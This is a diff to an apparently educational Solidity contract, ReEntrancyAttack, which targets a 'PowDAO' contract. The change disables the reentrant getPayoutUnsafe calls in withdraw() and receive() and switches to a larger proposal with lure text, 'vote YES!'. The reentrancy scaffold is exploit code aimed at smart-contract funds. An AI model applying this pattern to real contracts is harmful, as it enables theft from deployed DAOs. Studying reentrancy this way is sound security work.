@@ -14,6 +14,7 @@ contract ReEntrancyAttack {
         hasAttacked = false;
         powdao = PowDAO(contractAddress);
         console.log(contractAddress.balance);
+        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
     }
 
     function deposit() public payable {
@@ -22,18 +23,18 @@ contract ReEntrancyAttack {
 
     function withdraw() public {
         console.log("Withdrawing from PowDAO with gas ", gasleft());
-        powdao.getPayout(address(this));
+        //powdao.getPayoutUnsafe(address(this));
     }
 
     function submitProposal() public {
-        powdao.submitProposal(.01*10**18, "test reentrancy");
+        powdao.submitProposal(1*10**18, "Super important proposal, vote YES!");
     }
 
     receive() external payable {
         console.log("Not attacked yet with gas ", gasleft());
         if(!hasAttacked){
             console.log("Withdrawing from powdao");
-            powdao.getPayout(address(this));
+            //powdao.getPayoutUnsafe(address(this));
             hasAttacked = true;
         }
         console.log("Done attacking");
